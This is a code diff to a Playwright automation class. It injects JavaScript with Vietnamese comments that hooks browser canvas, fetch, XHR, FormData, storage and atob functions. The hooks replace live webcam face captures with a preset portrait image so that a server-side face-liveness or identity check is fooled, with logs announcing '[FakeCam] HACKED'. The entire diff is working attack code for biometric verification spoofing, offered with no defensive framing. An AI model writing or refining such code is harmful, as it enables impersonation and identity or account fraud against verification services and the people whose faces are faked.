@@ -297,17 +297,22 @@ class PlaywrightRunner:
 		  const _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
 		  const _origToBlob    = HTMLCanvasElement.prototype.toBlob;
 		  const recentFaces = [];
-		  const hdPortraitRaw = "{portrait_b64}".split(',')[1];
+		  const HD_PORTRAIT_URI = "{portrait_b64}";
+		  const hdPortraitRaw = HD_PORTRAIT_URI.split(',')[1];
 		  
-		  // 1. Theo dõi toDataURL để lấy mẫu ảnh (không thay đổi kết quả để liveness vẫn chạy mượt)
+		  // 1. Đánh chặn toDataURL: Canvas lớn (chụp khuôn mặt) → trả thẳng ảnh HD Portrait
+		  //    Canvas nhỏ (helper) → giữ nguyên + ghi log cho replaceFaceInPayload
 		  HTMLCanvasElement.prototype.toDataURL = function(type, encoderOptions) {{
+		      // Canvas lớn = chụp khuôn mặt → trả ảnh HD Portrait sạch đẹp, KHÔNG viền mờ
+		      if (this.width >= 400 && this.height >= 400) {{
+		          return HD_PORTRAIT_URI;
+		      }}
 		      const res = _origToDataURL.apply(this, arguments);
-		      // Hạ giới hạn xuống 5000 để bắt được cả những ảnh nền trơn bị nén dung lượng cực thấp
 		      if (res && res.length > 5000) {{
 		          const parts = res.split(',');
 		          if (parts.length === 2) {{
 		              recentFaces.push(parts[1]);
-		              if (recentFaces.length > 200) recentFaces.shift(); // Giữ 200 frame gần nhất (khoảng 6 giây)
+		              if (recentFaces.length > 200) recentFaces.shift();
 		          }}
 		      }}
 		      return res;
@@ -317,7 +322,7 @@ class PlaywrightRunner:
 		  HTMLCanvasElement.prototype.toBlob = function(callback, type, quality) {{
 		      if (this.width >= 400 && this.height >= 400) {{
 		          console.log("[FakeCam] HACKED toBlob! Injecting HD Portrait to Server!");
-		          fetch("{portrait_b64}").then(res => res.blob()).then(blob => callback(blob));
+		          fetch(HD_PORTRAIT_URI).then(res => res.blob()).then(blob => callback(blob));
 		          return;
 		      }}
 		      return _origToBlob.apply(this, arguments);
@@ -326,14 +331,33 @@ class PlaywrightRunner:
 		  // Hàm hỗ trợ quét và thay thế
 		  function replaceFaceInPayload(bodyStr) {{
 		      if (typeof bodyStr !== 'string' || !hdPortraitRaw) return bodyStr;
+		      let modified = bodyStr;
 		      // Quét ngược từ frame mới nhất về cũ nhất
 		      for (let i = recentFaces.length - 1; i >= 0; i--) {{
-		          if (bodyStr.includes(recentFaces[i])) {{
-		              console.log("[FakeCam] HACKED! Gửi ảnh siêu nét lên server (Frame " + i + ").");
-		              return bodyStr.replace(recentFaces[i], hdPortraitRaw);
+		          const plainFace = recentFaces[i];
+		          
+		          // 1. Dạng base64 thuần
+		          if (modified.includes(plainFace)) {{
+		              console.log("[FakeCam] HACKED! Gửi ảnh siêu nét lên server (Plain - Frame " + i + ").");
+		              modified = modified.split(plainFace).join(hdPortraitRaw);
+		          }}
+		          
+		          // 2. Dạng URL Encoded (thường dùng trong form urlencoded)
+		          const urlEncodedFace = encodeURIComponent(plainFace);
+		          if (modified.includes(urlEncodedFace)) {{
+		              console.log("[FakeCam] HACKED! Gửi ảnh siêu nét lên server (UrlEncoded - Frame " + i + ").");
+		              modified = modified.split(urlEncodedFace).join(encodeURIComponent(hdPortraitRaw));
+		          }}
+		          
+		          // 3. Dạng JSON Escaped (thường dùng trong JSON stringify)
+		          const jsonEscapedFace = plainFace.split('/').join('\\\\/');
+		          const hdEscapedFace = hdPortraitRaw.split('/').join('\\\\/');
+		          if (modified.includes(jsonEscapedFace)) {{
+		              console.log("[FakeCam] HACKED! Gửi ảnh siêu nét lên server (JSON Escaped - Frame " + i + ").");
+		              modified = modified.split(jsonEscapedFace).join(hdEscapedFace);
 		          }}
 		      }}
-		      return bodyStr;
+		      return modified;
 		  }}
 
 		  // 3. Đánh chặn XHR (Thay ruột gói tin API trước khi bay lên server)
@@ -343,22 +367,43 @@ class PlaywrightRunner:
 		      return _origXHRSend.apply(this, arguments);
 		  }};
 
-		  // 4. Đánh chặn fetch API
+		  // 4. Đánh chặn fetch API (Cả body lẫn data URI)
 		  const _origFetch = window.fetch;
 		  window.fetch = async function(...args) {{
+		      if (args[0] && typeof args[0] === 'string' && args[0].startsWith('data:')) {{
+		          args[0] = replaceFaceInPayload(args[0]);
+		      }}
 		      if (args[1] && typeof args[1].body === 'string') {{
 		          args[1].body = replaceFaceInPayload(args[1].body);
 		      }}
 		      return _origFetch.apply(this, args);
 		  }};
 
-		  // 5. Đánh chặn FormData (Trường hợp API dùng form-data)
+		  // 5. Đánh chặn FormData (Trường hợp API dùng form-data gửi string)
 		  const _origAppend = FormData.prototype.append;
 		  FormData.prototype.append = function(name, value, filename) {{
 		      if (typeof value === 'string') {{
 		          value = replaceFaceInPayload(value);
 		      }}
 		      return _origAppend.apply(this, arguments);
+		  }};
+
+		  // 6. Đánh chặn sessionStorage / localStorage (Ngăn SDK truyền ảnh mờ sang trang Xác nhận)
+		  const _origSetItem = Storage.prototype.setItem;
+		  Storage.prototype.setItem = function(key, value) {{
+		      if (typeof value === 'string') {{
+		          value = replaceFaceInPayload(value);
+		      }}
+		      return _origSetItem.apply(this, arguments);
+		  }};
+
+		  // 7. Đánh chặn atob (Trường hợp SDK dùng atob để convert base64 thành Blob)
+		  const _origAtob = window.atob;
+		  window.atob = function(data) {{
+		      if (typeof data === 'string') {{
+		          data = replaceFaceInPayload(data);
+		      }}
+		      return _origAtob.apply(this, arguments);
 		  }};
 
 		  /* ---------- constants ---------- */
